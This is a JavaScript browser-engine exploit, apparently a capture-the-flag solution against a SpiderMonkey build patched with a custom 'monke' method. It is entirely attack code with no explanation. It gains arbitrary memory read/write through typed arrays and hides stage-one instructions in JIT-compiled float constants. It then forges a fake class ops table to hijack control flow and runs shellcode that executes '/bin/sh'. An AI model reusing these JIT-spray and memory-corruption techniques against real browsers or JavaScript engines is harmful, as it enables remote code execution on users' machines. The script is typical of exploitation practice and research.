let converter = new ArrayBuffer(8);
let u64view = new BigUint64Array(converter);
let f64view = new Float64Array(converter);

function i2d(x) {
  u64view[0] = x;
  return f64view[0];
}

function d2i(x) {
  f64view[0] = x;
  return u64view[0];
}

function print(x) {
  console.log(x);
}

function hex(x) {
  return `0x${x.toString(16)}`;
}

function assert(x, msg) {
  if (!x) {
    throw new Error(msg);
  }
}

function jitme() {
  const magic = 4.183559446463817e-216;

  const g1 = 1.4501798452584495e-277;
  const g2 = 1.4499730218924257e-277;
  const g3 = 1.4632559875735264e-277;
  const g4 = 1.4364759325952765e-277;
  const g5 = 1.450128571490163e-277;
  const g6 = 1.4501798485024445e-277;
  const g7 = 1.4345589835166586e-277;
  const g8 = 1.616527814e-314;
}

var iarr = new Int8Array([
  1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4, 1, 2,
  3, 4, 1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4,
]);
var iarr_map = iarr.monke();
var barr = new BigInt64Array([1n, 2n, 3n, 4n]);
var barr_map = barr.monke();

iarr.monke(barr_map);

function pwn() {
  function write64(addr, val) {
    iarr[27] = addr;
    barr[0] = val;
  }

  function read64(addr) {
    iarr[27] = addr;
    return barr[0];
  }

  function read(addr, size) {
    assert(size % 8n === 0n);
    let ret = new BigUint64Array(Number(size) / 8);
    for (let i = 0n; i < size / 8n; i++) {
      ret[i] = read64(addr + i * 8n);
    }
    return new Uint8Array(ret.buffer);
  }

  function addrof(thing) {
    return BigInt("0x" + objectAddress(thing));
  }

  for (let i = 0; i < 100000; i++) {
    jitme();
  }

  const addrof_jitme = addrof(jitme);
  const codepage_addr =
    read64(read64(addrof_jitme + 0x28n)) & 0xfffffffffffff000n;
  print(`addrof(jitme) = ${hex(addrof_jitme)}`);
  print(`code page at = ${hex(codepage_addr)}`);

  const code = read(codepage_addr, 0x1000n);
  let stage1_offset = -1;
  for (let i = 0; i < 0x1000 - 8; i++) {
    if (
      code[i] == 0x37 &&
      code[i + 1] == 0x13 &&
      code[i + 2] == 0x37 &&
      code[i + 3] == 0x13 &&
      code[i + 4] == 0x37 &&
      code[i + 5] == 0x13 &&
      code[i + 6] == 0x37 &&
      code[i + 7] == 0x13
    ) {
      stage1_offset = i + 14;
      break;
    }
  }

  assert(stage1_offset !== -1);
  const stage1_addr = BigInt(stage1_offset) + codepage_addr;
  print(`stage1_addr = ${hex(stage1_addr)}`);

  const shellcode = new Uint8Array([
    72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 99, 104, 111, 46, 114,
    105, 1, 72, 49, 4, 36, 72, 137, 231, 49, 210, 49, 246, 106, 59, 88, 15, 5,
  ]);

  const addrof_shellcode = addrof(shellcode);
  const shellcode_shape = read64(addrof_shellcode);
  const shellcode_base_shape = read64(shellcode_shape);
  const shellcode_class = read64(shellcode_base_shape);
  const shellcode_ops = read64(shellcode_class + 0x10n);
  const shellcode_data = read64(addrof_shellcode + 0x30n);
  print(`addrof(shellcode) = ${hex(addrof_shellcode)}`);
  print(`shellcode->shape = ${hex(shellcode_shape)}`);
  print(`shellcode->shape->base_shape = ${hex(shellcode_base_shape)}`);
  print(`shellcode->shape->base_shape->class = ${hex(shellcode_class)}`);
  print(`shellcode->shape->base_shape->class->ops = ${hex(shellcode_ops)}`);
  print(`shellcode->data = ${hex(shellcode_data)}`);

  const fake_class = new BigUint64Array(48);
  const fake_class_buffer = read64(addrof(fake_class) + 0x30n);
  for (let i = 0; i < 6; i++) {
    fake_class[i] = read64(shellcode_class + BigInt(i) * 8n);
  }

  const fake_ops = new BigUint64Array(88);
  const fake_ops_buffer = read64(addrof(fake_ops) + 0x30n);
  for (let i = 0; i < 11; i++) {
    fake_ops[i] = read64(shellcode_ops + BigInt(i) * 8n);
  }

  fake_ops[0] = stage1_addr;
  fake_class[2] = fake_ops_buffer;
  write64(shellcode_base_shape, fake_class_buffer);

  shellcode.someprop = i2d(shellcode_data);
}

try {
  pwn();
} catch (e) {
  print(`Got exception: ${e}`);
}
